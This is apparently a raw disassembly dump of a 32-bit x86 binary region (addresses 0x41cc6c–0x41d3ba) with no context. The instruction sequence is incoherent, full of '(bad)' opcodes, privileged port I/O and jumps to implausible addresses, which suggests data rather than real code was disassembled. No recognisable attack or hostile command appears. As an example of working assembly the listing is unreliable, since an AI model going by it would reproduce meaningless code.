  41cc6c:	sbb    eax,0x32747d66
  41cc71:	push   ss
  41cc72:	add    cl,al
  41cc74:	inc    esp
  41cc75:	lods   al,BYTE PTR ds:[esi]
  41cc76:	sahf   
  41cc77:	pop    eax
  41cc78:	mov    ecx,0x25966a7a
  41cc7d:	pusha  
  41cc7e:	(bad)  
  41cc7f:	test   BYTE PTR [eax],ch
  41cc81:	js     0x41ccf8
  41cc83:	in     eax,dx
  41cc84:	aas    
  41cc85:	rcl    BYTE PTR [esi+0x1690df64],cl
  41cc8b:	lods   eax,DWORD PTR ds:[esi]
  41cc8c:	int    0x42
  41cc8e:	xchg   edi,eax
  41cc8f:	jnp    0x41ccf9
  41cc91:	pop    ds
  41cc92:	add    DWORD PTR [edi+0x7e],0x57a81806
  41cc99:	xor    dh,BYTE PTR [ebp+0x4f]
  41cc9c:	inc    eax
  41cc9d:	retf   0x5bc2
  41cca0:	mov    ds:0x6d98ba00,al
  41cca5:	ret    0x5574
  41cca8:	cs test al,0x3
  41ccab:	pop    edi
  41ccac:	sbb    dl,bh
  41ccae:	retf   
  41ccaf:	adc    al,ah
  41ccb1:	jbe    0x41cc58
  41ccb3:	out    dx,al
  41ccb4:	loopne 0x41ccee
  41ccb6:	in     al,dx
  41ccb7:	ror    BYTE PTR [eax],0x37
  41ccba:	stos   DWORD PTR es:[edi],eax
  41ccbb:	push   0x32
  41ccbd:	xor    dh,BYTE PTR [ecx]
  41ccbf:	mov    edx,0x8e69c7f3
  41ccc4:	int3   
  41ccc5:	loope  0x41cce8
  41ccc7:	jb     0x41cca6
  41ccc9:	pop    ds
  41ccca:	dec    eax
  41cccb:	mov    edi,DWORD PTR [ecx]
  41cccd:	push   esi
  41ccce:	pop    ss
  41cccf:	les    ebp,FWORD PTR [eax+0x27576a6b]
  41ccd5:	push   ecx
  41ccd6:	inc    ecx
  41ccd7:	mov    edx,0xae708f57
  41ccdc:	aad    0xf8
  41ccde:	mov    dh,0x32
  41cce0:	ss jmp 0x332d64c9
  41cce6:	push   cs
  41cce7:	jns    0x41cd60
  41cce9:	add    eax,0x280e429a
  41ccee:	ficomp DWORD PTR [ecx]
  41ccf0:	jle    0x41cc87
  41ccf2:	(bad)  
  41ccf3:	sbb    al,0x1e
  41ccf5:	inc    ebp
  41ccf6:	dec    ebp
  41ccf7:	pop    eax
  41ccf8:	xor    BYTE PTR [edi+0x6a],al
  41ccfb:	cmc    
  41ccfc:	test   eax,0xb533fa92
  41cd01:	push   cs
  41cd02:	sbb    al,0xf4
  41cd04:	iret   
  41cd05:	add    eax,0x88d11f2
  41cd0a:	gs cmp ebp,eax
  41cd0d:	dec    ecx
  41cd0e:	mov    ds:0x2e2ca24f,al
  41cd13:	jne    0x41cd51
  41cd15:	iret   
  41cd16:	xor    BYTE PTR [ebp+0x76],cl
  41cd19:	fs cmp al,0xb4
  41cd1c:	or     BYTE PTR [edx+ebp*1+0x3b7adf28],0xf0
  41cd24:	outs   dx,DWORD PTR cs:[esi]
  41cd26:	jg     0x41cd12
  41cd28:	cwde   
  41cd29:	int3   
  41cd2a:	mov    esp,0xc36aef91
  41cd2f:	pop    edx
  41cd30:	fiadd  WORD PTR [ebp-0x6f]
  41cd33:	outs   dx,BYTE PTR ds:[esi]
  41cd34:	mov    ah,0xd9
  41cd36:	ret    
  41cd37:	mov    bh,0xef
  41cd39:	pop    ss
  41cd3a:	xlat   BYTE PTR ds:[ebx]
  41cd3b:	test   BYTE PTR [edx],dh
  41cd3d:	add    BYTE PTR [ebp+ecx*4+0x4e4da750],dl
  41cd44:	mov    esi,eax
  41cd46:	out    0x7,eax
  41cd48:	pop    ss
  41cd49:	nop
  41cd4a:	pop    ss
  41cd4b:	mov    eax,ds:0x73b5bd7b
  41cd50:	mov    ebp,0x64122edd
  41cd55:	ds push ecx
  41cd57:	xchg   esp,eax
  41cd58:	cmp    dh,dh
  41cd5a:	mov    edi,0x8987ef16
  41cd5f:	jb     0x41cda7
  41cd61:	ins    BYTE PTR es:[edi],dx
  41cd62:	outs   dx,BYTE PTR ds:[esi]
  41cd63:	repz pusha 
  41cd65:	ss aaa 
  41cd67:	pop    ds
  41cd68:	mov    edx,0xea8660ac
  41cd6d:	xchg   esp,eax
  41cd6e:	scas   al,BYTE PTR es:[edi]
  41cd6f:	(bad)  
  41cd70:	lods   al,BYTE PTR ds:[esi]
  41cd71:	aad    0x6e
  41cd73:	rcl    DWORD PTR [ebp+0x53],cl
  41cd76:	ret    0xf103
  41cd79:	mov    al,ds:0xc22c31c2
  41cd7e:	js     0x41cd31
  41cd80:	int    0xd2
  41cd82:	pop    ebp
  41cd83:	nop
  41cd84:	push   ss
  41cd85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd86:	mov    eax,ds:0x841f0362
  41cd8b:	xor    al,0xd0
  41cd8d:	mov    eax,0x7e6b4725
  41cd92:	push   ds
  41cd93:	jmp    0x46402cbd
  41cd98:	sbb    al,0xed
  41cd9a:	pushf  
  41cd9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd9c:	fs jno 0x41ce14
  41cd9f:	pusha  
  41cda0:	es cmp al,0xa6
  41cda3:	sbb    DWORD PTR [esi+0x9999f7e],ecx
  41cda9:	stos   DWORD PTR es:[edi],eax
  41cdaa:	aad    0x8d
  41cdac:	sbb    DWORD PTR [edi-0x550d25ca],ebx
  41cdb2:	dec    ebx
  41cdb3:	push   0xd04d6fee
  41cdb8:	outs   dx,DWORD PTR ds:[esi]
  41cdb9:	cwde   
  41cdba:	scas   al,BYTE PTR es:[edi]
  41cdbb:	push   eax
  41cdbc:	mov    dl,0xc5
  41cdbe:	imul   edx,DWORD PTR [edi],0x6412de39
  41cdc4:	inc    ebx
  41cdc5:	sbb    BYTE PTR [edx-0x6c86b800],dh
  41cdcb:	(bad)  [ebp-0x3d]
  41cdce:	adc    dl,BYTE PTR [ecx]
  41cdd0:	fbstp  TBYTE PTR [edi-0x10]
  41cdd3:	mov    al,ds:0xddef5848
  41cdd8:	xlat   BYTE PTR ds:[ebx]
  41cdd9:	pop    ecx
  41cdda:	mov    edi,0x94a4d0df
  41cddf:	dec    ecx
  41cde0:	add    edi,ebp
  41cde2:	push   edx
  41cde3:	adc    esp,ebp
  41cde5:	out    dx,eax
  41cde6:	push   0x33
  41cde8:	jecxz  0x41cde7
  41cdea:	mov    cl,0x67
  41cdec:	std    
  41cded:	fcom   QWORD PTR [eax]
  41cdef:	jecxz  0x41cd9a
  41cdf1:	dec    esp
  41cdf2:	jo     0x41ce65
  41cdf4:	in     eax,0x91
  41cdf6:	stc    
  41cdf7:	call   0x8cc6ad9e
  41cdfc:	cmp    cl,ah
  41cdfe:	mov    cl,0xe7
  41ce00:	in     al,0x56
  41ce02:	pop    ss
  41ce03:	(bad)  
  41ce04:	push   edx
  41ce05:	iret   
  41ce06:	push   ebp
  41ce07:	push   cs
  41ce08:	test   ebx,ebx
  41ce0a:	mov    bh,0xc1
  41ce0c:	stos   BYTE PTR es:[edi],al
  41ce0d:	mov    ds:0x121c777a,al
  41ce12:	ror    DWORD PTR fs:[eax+0x6c],cl
  41ce16:	outs   dx,BYTE PTR ds:[esi]
  41ce17:	or     ch,al
  41ce19:	ja     0x41cdc8
  41ce1b:	frstor [esp+eax*4]
  41ce1e:	mov    ds:0xc3d1e273,al
  41ce23:	mov    al,ds:0x33fcddff
  41ce28:	call   0xb494:0xfff63018
  41ce2f:	imul   ecx,ebx,0x9d32fcf6
  41ce35:	pop    ss
  41ce36:	iret   
  41ce37:	jmp    0x41ce3d
  41ce39:	jnp    0x41ce07
  41ce3b:	dec    edx
  41ce3c:	int3   
  41ce3d:	mov    WORD PTR [edi],?
  41ce3f:	repz jns 0x41cdf4
  41ce42:	stos   BYTE PTR es:[edi],al
  41ce43:	jle    0x41ce54
  41ce45:	jbe    0x41ce19
  41ce47:	rol    DWORD PTR [ecx-0x6d],cl
  41ce4a:	popa   
  41ce4b:	(bad)  
  41ce4c:	outs   dx,DWORD PTR ds:[esi]
  41ce4d:	shl    DWORD PTR [edx],1
  41ce4f:	stos   DWORD PTR es:[edi],eax
  41ce50:	cwde   
  41ce51:	adc    DWORD PTR [eax+0x42],edx
  41ce54:	mov    eax,ds:0xe2233f00
  41ce59:	popf   
  41ce5a:	dec    esi
  41ce5b:	lock shl BYTE PTR [edx+0xfd7b23e],0x92
  41ce63:	mov    ecx,0xe633582e
  41ce68:	(bad)  
  41ce69:	dec    esp
  41ce6a:	xchg   esp,eax
  41ce6b:	int3   
  41ce6c:	xchg   DWORD PTR ds:0x76f70c1d,esp
  41ce72:	add    BYTE PTR [edx-0x39ff86fc],bh
  41ce78:	shl    ch,0x38
  41ce7b:	add    eax,0xac8e2cdb
  41ce80:	das    
  41ce81:	mov    ch,0xa4
  41ce83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce84:	jne    0x41ce54
  41ce86:	fistp  QWORD PTR [ebp+ebp*4-0x35]
  41ce8a:	scas   al,BYTE PTR es:[edi]
  41ce8b:	les    esi,FWORD PTR [esi]
  41ce8d:	mov    ds:0xc93ac8ed,al
  41ce92:	jg     0x41ced3
  41ce94:	adc    cl,cl
  41ce96:	shr    DWORD PTR [esi+0x48206f22],cl
  41ce9c:	add    DWORD PTR ds:0xa01a0830,ebx
  41cea2:	test   ch,ah
  41cea4:	adc    al,0xa2
  41cea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cea7:	adc    BYTE PTR [ecx+0x783c5432],al
  41cead:	daa    
  41ceae:	in     al,dx
  41ceaf:	stos   DWORD PTR es:[edi],eax
  41ceb0:	cmovle eax,ebp
  41ceb3:	cwde   
  41ceb4:	sub    BYTE PTR [edx-0x7f],bh
  41ceb7:	mov    esp,0xaeda512f
  41cebc:	popf   
  41cebd:	sub    eax,0x8cf3f4f
  41cec2:	push   edx
  41cec3:	pop    esi
  41cec4:	push   es
  41cec5:	mov    esp,0x63bca4c3
  41ceca:	ja     0x41ceda
  41cecc:	stc    
  41cecd:	sub    DWORD PTR [esi-0x71],ecx
  41ced0:	rol    DWORD PTR [ecx],1
  41ced2:	cdq    
  41ced3:	fdivrp st(5),st
  41ced5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ced6:	adc    BYTE PTR [ebx],dl
  41ced8:	scas   al,BYTE PTR es:[edi]
  41ced9:	push   es
  41ceda:	sbb    BYTE PTR [ebx],0xb0
  41cedd:	ins    DWORD PTR es:[edi],dx
  41cede:	hlt    
  41cedf:	add    al,0x17
  41cee1:	sub    BYTE PTR [ecx+0x79aa4c1b],al
  41cee7:	imul   ecx,ebx,0x41
  41ceea:	jmp    0x41cead
  41ceec:	loopne 0x41cf03
  41ceee:	fcomip st,st(7)
  41cef0:	pop    ds
  41cef1:	dec    DWORD PTR [eax]
  41cef3:	daa    
  41cef4:	xor    DWORD PTR [ecx+0x31f49c62],ebx
  41cefa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cefb:	lods   al,BYTE PTR ds:[esi]
  41cefc:	sbb    BYTE PTR [edi+esi*4+0x7b20fb66],dh
  41cf03:	xor    al,BYTE PTR [esi-0x7c]
  41cf06:	and    al,0x5
  41cf08:	(bad)  
  41cf09:	or     eax,0x38e6f39c
  41cf0e:	(bad)  
  41cf0f:	not    DWORD PTR [ebx*2+0x22a3ff09]
  41cf16:	mov    WORD PTR [esi],gs
  41cf18:	jmp    0xf3f86a9f
  41cf1d:	sbb    esi,0x41
  41cf20:	fbld   TBYTE PTR [eax]
  41cf22:	mov    dh,0x7b
  41cf24:	sar    BYTE PTR [ebx],cl
  41cf26:	add    BYTE PTR [edi-0x9],cl
  41cf29:	ror    ecx,1
  41cf2b:	pop    eax
  41cf2c:	mov    bl,0x5d
  41cf2e:	inc    ecx
  41cf2f:	pushf  
  41cf30:	(bad)  
  41cf31:	jnp    0x41ced4
  41cf33:	add    BYTE PTR [eax],bl
  41cf35:	and    DWORD PTR [eax-0x72],esp
  41cf38:	ds mov ecx,0x7e1da85b
  41cf3e:	push   ss
  41cf3f:	out    0xce,eax
  41cf41:	sbb    al,0x29
  41cf43:	cmp    al,0xad
  41cf45:	fisub  DWORD PTR [esi-0x699b11c2]
  41cf4b:	jmp    0x41cf97
  41cf4d:	nop
  41cf4e:	and    DWORD PTR [esi-0x544c95e0],edx
  41cf54:	fadd   DWORD PTR [esp-0x46302d83]
  41cf5b:	pop    ebp
  41cf5c:	test   al,0xc6
  41cf5e:	push   ecx
  41cf5f:	push   ebx
  41cf60:	mov    ds:0xce634fa,eax
  41cf65:	add    al,0x45
  41cf67:	ins    BYTE PTR es:[edi],dx
  41cf68:	xchg   ecx,eax
  41cf69:	lock fdiv st(0),st
  41cf6c:	sbb    eax,0x9e7bdcd
  41cf71:	push   edx
  41cf72:	xchg   ebx,eax
  41cf73:	(bad)  
  41cf74:	ss popa 
  41cf76:	repz pushf 
  41cf78:	xchg   edx,eax
  41cf79:	inc    ecx
  41cf7a:	xchg   ebx,eax
  41cf7b:	stos   BYTE PTR es:[edi],al
  41cf7c:	mov    cl,0xba
  41cf7e:	retf   0x850
  41cf81:	es dec esi
  41cf83:	mov    al,ds:0xf62a4cb1
  41cf88:	jb     0x41cfc7
  41cf8a:	popf   
  41cf8b:	xchg   edi,eax
  41cf8c:	stc    
  41cf8d:	stc    
  41cf8e:	loope  0x41cffb
  41cf90:	cmp    BYTE PTR [ebx+0x47],al
  41cf93:	cdq    
  41cf94:	ss fs div edi
  41cf98:	or     edi,DWORD PTR [edi-0x7ff8c2ac]
  41cf9e:	idiv   ebx
  41cfa0:	fnstcw WORD PTR [edi+esi*4]
  41cfa3:	pop    ebp
  41cfa4:	xor    DWORD PTR [ebx],ebp
  41cfa6:	pop    ecx
  41cfa7:	repz pop esi
  41cfa9:	sub    eax,0x2ea2a4a4
  41cfae:	or     BYTE PTR [edi+0x351789d9],0x65
  41cfb5:	lock arpl WORD PTR [edx-0xd],di
  41cfb9:	fbld   TBYTE PTR [ebp+0x29]
  41cfbc:	jbe    0x41cf74
  41cfbe:	and    bl,BYTE PTR [edi]
  41cfc0:	push   0xffffff8e
  41cfc2:	adc    DWORD PTR [ebp+eiz*1+0x7ac0f8f5],ebx
  41cfc9:	retf   
  41cfca:	ror    DWORD PTR [eax+0x48087526],cl
  41cfd0:	data16 cmps BYTE PTR es:[esi],BYTE PTR es:[edi]
  41cfd3:	adc    BYTE PTR [ecx+0x138a9297],0x91
  41cfda:	std    
  41cfdb:	mov    ebx,0x685dc6e2
  41cfe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfe1:	or     DWORD PTR [edi-0x3cee7b35],ebp
  41cfe7:	cmp    ch,BYTE PTR [eax+0x55]
  41cfea:	mov    edx,0xd7eac884
  41cfef:	out    dx,al
  41cff0:	(bad)
  41cff4:	jle    0x41d018
  41cff6:	mov    al,0x25
  41cff8:	and    eax,ebp
  41cffa:	or     al,0xc0
  41cffc:	fisttp WORD PTR ds:0x83c2ac00
  41d002:	ror    DWORD PTR [eax+0x7c],0x63
  41d006:	je     0x41d06f
  41d008:	pusha  
  41d009:	inc    eax
  41d00a:	push   ebx
  41d00b:	xchg   ebp,eax
  41d00c:	mov    edx,0x93ff9465
  41d011:	sub    ebp,DWORD PTR [ecx-0x8]
  41d014:	push   ecx
  41d015:	sbb    ah,BYTE PTR [eax-0x12cd9cb0]
  41d01b:	xchg   BYTE PTR [ebp+0x39],dl
  41d01e:	cmp    ebx,ebp
  41d020:	jno    0x41d03b
  41d022:	push   0xffffff8b
  41d024:	mov    cl,0xf8
  41d026:	sbb    DWORD PTR [esi+0x3d],eax
  41d029:	add    ebp,DWORD PTR [eax]
  41d02b:	(bad)  
  41d02c:	int3   
  41d02d:	(bad)  
  41d02e:	int3   
  41d02f:	add    ebp,eax
  41d031:	out    0x46,eax
  41d033:	(bad)  
  41d035:	jmp    0x41cfd3
  41d037:	sti    
  41d038:	sub    DWORD PTR [eax],edx
  41d03a:	sub    ebx,DWORD PTR [esi+0x6d]
  41d03d:	mov    dl,0x32
  41d03f:	xchg   bl,ch
  41d041:	mov    esp,0xd18cf83e
  41d046:	lock cmp DWORD PTR [eax+0x52],edi
  41d04a:	xor    DWORD PTR [esi-0x8],ecx
  41d04d:	jmp    0xd4d9381a
  41d052:	pop    edx
  41d053:	and    al,0x90
  41d055:	loope  0x41d027
  41d057:	pop    edi
  41d058:	dec    esp
  41d059:	xchg   ecx,eax
  41d05a:	scas   al,BYTE PTR es:[edi]
  41d05b:	add    eax,0xd4cf5056
  41d060:	sub    eax,0x83170d22
  41d065:	jl     0x41d0b4
  41d067:	pusha  
  41d068:	jecxz  0x41d076
  41d06a:	sahf   
  41d06b:	movhlps xmm5,xmm3
  41d06e:	aas    
  41d06f:	xchg   esi,ebp
  41d071:	lods   eax,DWORD PTR ds:[esi]
  41d072:	out    dx,eax
  41d073:	pop    es
  41d074:	push   cs
  41d075:	xor    eax,0xe3492150
  41d07a:	and    dl,BYTE PTR [edx+0x29]
  41d07d:	mov    bh,0x55
  41d07f:	cld    
  41d080:	pusha  
  41d081:	cmp    eax,0x35b86b71
  41d086:	out    0x6e,eax
  41d088:	dec    ecx
  41d089:	out    dx,al
  41d08a:	aam    0xa2
  41d08c:	pusha  
  41d08d:	mov    eax,0x9b6fe6fa
  41d092:	xchg   BYTE PTR [edx-0xb08d1b8],bh
  41d098:	(bad)  
  41d099:	enter  0x6bad,0x4
  41d09d:	pop    es
  41d09e:	jmp    DWORD PTR [ecx]
  41d0a0:	mov    esi,DWORD PTR [edi]
  41d0a2:	xor    bl,BYTE PTR [edi]
  41d0a4:	lock ins BYTE PTR es:[edi],dx
  41d0a6:	adc    eax,0x4ec30f8
  41d0ab:	ret    
  41d0ac:	add    DWORD PTR ds:0xaa66747a,ebx
  41d0b2:	push   ebx
  41d0b3:	push   ss
  41d0b4:	push   edi
  41d0b5:	sahf   
  41d0b6:	jg     0x41d0d3
  41d0b8:	mov    eax,ds:0xd744316a
  41d0bd:	iret   
  41d0be:	lea    esi,[edi-0x5a]
  41d0c1:	add    al,0x61
  41d0c3:	ins    BYTE PTR es:[edi],dx
  41d0c4:	mov    al,ch
  41d0c6:	test   eax,0xfb6d6de6
  41d0cb:	fiadd  WORD PTR [edi+0x1a]
  41d0ce:	mov    al,ds:0x90878d64
  41d0d3:	pop    ss
  41d0d4:	mov    DWORD PTR [ebx-0x4c6bc070],esp
  41d0da:	mov    al,ds:0xb3ba4ce5
  41d0df:	mov    ds:0x24700d3c,eax
  41d0e4:	add    eax,0xfdb90529
  41d0e9:	jg     0x41d116
  41d0eb:	inc    ebp
  41d0ec:	loope  0x41d08f
  41d0ee:	in     eax,0xea
  41d0f0:	xor    ch,cl
  41d0f2:	sbb    DWORD PTR [ebp+0x36dc7c3a],ebp
  41d0f8:	fcom   DWORD PTR [ebp+0x7c]
  41d0fb:	out    dx,al
  41d0fc:	jae    0x41d11b
  41d0fe:	mov    BYTE PTR [esi+0x4f1da488],al
  41d104:	aad    0x65
  41d106:	sti    
  41d107:	and    eax,0x171649c3
  41d10c:	int    0xd0
  41d10e:	bsf    esi,DWORD PTR [edx-0x30]
  41d112:	leave  
  41d113:	fadd   QWORD PTR [ebx-0x225bfad5]
  41d119:	and    dl,BYTE PTR [ecx-0x7c]
  41d11c:	cmp    BYTE PTR ds:0xaae85aef,ah
  41d122:	or     eax,0xd057f58d
  41d127:	mov    edx,ecx
  41d129:	push   0xfffffff4
  41d12b:	repnz icebp 
  41d12d:	xchg   DWORD PTR [ebp+edx*2+0x543cfaec],ebx
  41d134:	lea    eax,[edx-0xefb93ed]
  41d13a:	push   ds
  41d13b:	pop    DWORD PTR [ebp-0x6ac74af]
  41d141:	inc    edx
  41d142:	imul   ecx,DWORD PTR [eax],0xe4983d9d
  41d148:	lock stos DWORD PTR es:[edi],eax
  41d14a:	xor    bl,ch
  41d14c:	dec    edi
  41d14d:	push   esp
  41d14e:	mov    ?,WORD PTR [eax-0x6da61e19]
  41d154:	hlt    
  41d155:	aad    0x17
  41d157:	aaa    
  41d158:	inc    edx
  41d159:	jae    0x41d10a
  41d15b:	shr    BYTE PTR [eax],1
  41d15d:	outs   dx,BYTE PTR ds:[esi]
  41d15e:	mov    ebp,0xb8407bf4
  41d163:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d164:	call   0x9221:0xc49fac59
  41d16b:	imul   BYTE PTR [ebp-0x40]
  41d16e:	fimul  DWORD PTR [esi+ebx*8]
  41d171:	sti    
  41d172:	fisubr WORD PTR [ebx+eax*1-0x341d2192]
  41d179:	jge    0x41d17f
  41d17b:	add    al,0xfc
  41d17d:	bound  edx,QWORD PTR [ecx-0x4f]
  41d180:	or     bh,BYTE PTR [ecx+0x4d]
  41d183:	outs   dx,BYTE PTR ds:[esi]
  41d184:	sbb    al,0x8d
  41d186:	or     eax,0xb4a10e00
  41d18b:	leave  
  41d18c:	test   DWORD PTR [ecx+ecx*4],eax
  41d18f:	cs mov ebp,0xe301df35
  41d195:	daa    
  41d196:	inc    edi
  41d197:	int    0x1d
  41d199:	retf   
  41d19a:	data16 jg 0x41d143
  41d19d:	xor    ah,BYTE PTR [edx]
  41d19f:	iret   
  41d1a0:	pop    eax
  41d1a1:	in     al,0xe0
  41d1a3:	andps  xmm6,XMMWORD PTR [edx+ebp*1-0x6c0d58de]
  41d1ab:	jo     0x41d197
  41d1ad:	aaa    
  41d1ae:	xchg   esp,eax
  41d1af:	pop    eax
  41d1b0:	jno    0x41d1dc
  41d1b2:	cdq    
  41d1b3:	mov    ah,0xc5
  41d1b5:	sbb    ebp,DWORD PTR [esi+0x75]
  41d1b8:	(bad)  
  41d1b9:	xor    edi,DWORD PTR [edi+0x5d]
  41d1bc:	mov    ebx,0x2e7a720f
  41d1c1:	pop    edx
  41d1c2:	cwde   
  41d1c3:	jg     0x41d21c
  41d1c5:	push   esi
  41d1c6:	push   ebp
  41d1c7:	add    bh,bl
  41d1c9:	mov    dh,0x1f
  41d1cb:	repnz inc edx
  41d1cd:	push   esp
  41d1ce:	jno    0x41d15e
  41d1d0:	dec    edi
  41d1d2:	sbb    edx,eax
  41d1d4:	xor    al,0x9e
  41d1d6:	repnz loop 0x41d1de
  41d1d9:	retf   0x8680
  41d1dc:	(bad)  
  41d1dd:	std    
  41d1de:	sub    DWORD PTR [edi+eax*4],ebx
  41d1e1:	in     eax,dx
  41d1e2:	mov    DWORD PTR [esi+ecx*8],edi
  41d1e5:	ret    0x7ab4
  41d1e8:	and    BYTE PTR [eax-0x454ff06f],ch
  41d1ee:	in     al,0x27
  41d1f0:	sub    eax,0x2080b114
  41d1f5:	dec    esi
  41d1f6:	out    0xb8,eax
  41d1f8:	(bad)  
  41d1f9:	jmp    0x238350aa
  41d1fe:	sbb    eax,0xc1c96c0d
  41d203:	pop    DWORD PTR [ecx]
  41d205:	nop
  41d206:	xchg   edx,eax
  41d207:	(bad)  
  41d208:	call   0x12ca4bdb
  41d20d:	stos   BYTE PTR es:[edi],al
  41d20e:	mov    BYTE PTR [ebx],ch
  41d210:	adc    ebx,ebp
  41d212:	add    DWORD PTR [ecx+0x30],edi
  41d215:	lds    ecx,FWORD PTR [edi]
  41d217:	mov    BYTE PTR [ebp-0x7009c9a8],dl
  41d21d:	pushf  
  41d21e:	fwait
  41d21f:	imul   ecx,DWORD PTR [edi-0x37530add],0x4f
  41d226:	jno    0x41d1af
  41d228:	mov    eax,0x1809f7cb
  41d22d:	dec    ebx
  41d22e:	daa    
  41d22f:	jnp    0x41d22c
  41d231:	mov    ch,0xb9
  41d233:	pop    eax
  41d234:	pop    eax
  41d235:	xor    BYTE PTR [edx-0x1112d376],bh
  41d23b:	shr    BYTE PTR [ebx+0x4f69eaa8],cl
  41d241:	mov    eax,ds:0xfbcbad14
  41d246:	stos   DWORD PTR es:[edi],eax
  41d247:	icebp  
  41d248:	xor    edi,esp
  41d24a:	cli    
  41d24b:	popa   
  41d24c:	cmp    al,0x2a
  41d24e:	or     esi,DWORD PTR [eax-0x27]
  41d251:	pop    esp
  41d252:	jecxz  0x41d1dc
  41d254:	mov    al,0xad
  41d256:	lahf   
  41d257:	mov    ds:0x180b1263,al
  41d25c:	repnz ds std 
  41d25f:	es xor eax,0x7af312a2
  41d265:	sub    DWORD PTR [ecx-0x4],ebp
  41d268:	jmp    ecx
  41d26a:	(bad)
  41d26f:	mov    ecx,?
  41d271:	adc    DWORD PTR [edx-0x7f],eax
  41d274:	sub    BYTE PTR [eax],al
  41d276:	aaa    
  41d277:	cdq    
  41d278:	or     eax,0xe226c3fc
  41d27d:	jmp    0x41d2d3
  41d27f:	dec    ebp
  41d280:	inc    ebx
  41d281:	cs dec edi
  41d283:	std    
  41d284:	ret    0x2717
  41d287:	mov    ebp,0x762322c9
  41d28c:	pop    ecx
  41d28d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d28e:	cmp    al,0x50
  41d290:	ret    0xcc8a
  41d293:	fidivr WORD PTR [edx]
  41d295:	mov    BYTE PTR [edx-0x3e],bh
  41d298:	mov    al,0xf7
  41d29a:	mov    esp,0xb1b30521
  41d29f:	in     al,dx
  41d2a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2a1:	xor    al,0xb7
  41d2a3:	daa    
  41d2a4:	push   edx
  41d2a5:	cmp    ecx,eax
  41d2a7:	ret    
  41d2a8:	jae    0x41d2cf
  41d2aa:	bound  ebp,QWORD PTR [edx]
  41d2ac:	or     DWORD PTR [esi],esi
  41d2ae:	jmp    0xfd550014
  41d2b3:	stc    
  41d2b4:	and    ecx,DWORD PTR ss:[ecx+edi*4+0xa]
  41d2b9:	js     0x41d294
  41d2bb:	or     eax,0x214e58d1
  41d2c0:	push   ds
  41d2c1:	popa   
  41d2c2:	cmp    eax,DWORD PTR [eax+0x1e67818b]
  41d2c8:	xchg   ebp,eax
  41d2c9:	mov    dh,0x2d
  41d2cb:	inc    ecx
  41d2cc:	mov    esi,0xd1b057d2
  41d2d1:	std    
  41d2d2:	retf   0xe3ba
  41d2d5:	cmp    ch,cl
  41d2d7:	(bad)  
  41d2d8:	mov    esp,0x42375025
  41d2dd:	hlt    
  41d2de:	xor    BYTE PTR [ebx+0x1c],ah
  41d2e1:	das    
  41d2e2:	xchg   edx,eax
  41d2e3:	xlat   BYTE PTR ds:[ebx]
  41d2e4:	out    dx,al
  41d2e5:	xchg   esp,eax
  41d2e6:	add    dl,bl
  41d2e8:	cmp    al,0x4b
  41d2ea:	xchg   esi,eax
  41d2eb:	or     al,0x7d
  41d2ed:	sbb    cl,dh
  41d2ef:	inc    edx
  41d2f0:	mov    edi,DWORD PTR [ebp-0x1c]
  41d2f3:	or     al,0xce
  41d2f5:	es sbb ch,ch
  41d2f8:	imul   ebx,ebx,0x65
  41d2fb:	sub    al,0x3e
  41d2fd:	or     al,0x86
  41d2ff:	jne    0x41d30b
  41d301:	push   ebx
  41d302:	les    edi,FWORD PTR [ebp-0x44]
  41d305:	test   al,0x55
  41d307:	or     DWORD PTR [edx],0x3e
  41d30a:	xchg   DWORD PTR [ebp+0x19],ebx
  41d30d:	fmul   DWORD PTR [edi-0x1fa604f9]
  41d313:	xchg   eax,esi
  41d315:	xchg   ebx,eax
  41d316:	mov    al,0x86
  41d318:	loopne 0x41d323
  41d31a:	mov    cl,BYTE PTR [edi]
  41d31c:	push   0x6f7f8097
  41d321:	jb     0x41d32a
  41d323:	loopne 0x41d391
  41d325:	inc    ebx
  41d326:	adc    DWORD PTR [edx+0x325e6b92],edx
  41d32c:	shl    BYTE PTR [esi],1
  41d32e:	stos   BYTE PTR es:[edi],al
  41d32f:	lds    ecx,FWORD PTR [ebx+0x476cb617]
  41d335:	mov    ebp,0x15a48b9a
  41d33a:	xor    eax,0x58666556
  41d33f:	int    0x50
  41d341:	mov    ebp,0x47586b99
  41d346:	inc    edx
  41d347:	dec    esi
  41d348:	jmp    0x41d351
  41d34a:	popf   
  41d34b:	daa    
  41d34c:	rep lods eax,DWORD PTR ds:[esi]
  41d34e:	aas    
  41d34f:	dec    ebp
  41d350:	dec    edx
  41d351:	js     0x41d388
  41d353:	pop    ebp
  41d354:	or     al,0x72
  41d356:	push   esp
  41d357:	push   ebp
  41d358:	test   eax,0x56282513
  41d35d:	mov    edx,0x5415c6ba
  41d362:	daa    
  41d363:	push   edx
  41d364:	jle    0x41d383
  41d366:	mov    ecx,DWORD PTR [eax]
  41d368:	push   es
  41d369:	fwait
  41d36a:	je     0x41d371
  41d36c:	or     eax,0xb0a71c5c
  41d371:	xor    DWORD PTR [esi-0x5b032ac6],0xe6b86755
  41d37b:	mul    BYTE PTR [edx]
  41d37d:	push   esi
  41d37e:	repnz ss iret 
  41d381:	pushf  
  41d382:	mov    edi,0xf964da39
  41d387:	cdq    
  41d388:	inc    edx
  41d389:	jns    0x41d30c
  41d38b:	and    bl,ch
  41d38d:	jl     0x41d3e5
  41d38f:	aas    
  41d390:	retf   
  41d391:	push   ds
  41d392:	loop   0x41d3e7
  41d394:	js     0x41d364
  41d396:	cld    
  41d397:	and    DWORD PTR [edx+0x3ee2f14b],edi
  41d39d:	aad    0x50
  41d39f:	cs (bad) 
  41d3a1:	mov    ds:0xf596d860,eax
  41d3a6:	arpl   WORD PTR [ebp+0x5e0f982f],ax
  41d3ac:	ds inc ebp
  41d3ae:	into   
  41d3af:	scas   al,BYTE PTR es:[edi]
  41d3b0:	cld    
  41d3b1:	push   ebp
  41d3b2:	jne    0x41d3fa
  41d3b4:	jg     0x41d393
  41d3b6:	or     BYTE PTR [esi-0x4e],bh
  41d3b9:	inc    esp
  41d3ba:	add    ecx,DWORD PTR [ebx-0x2c]
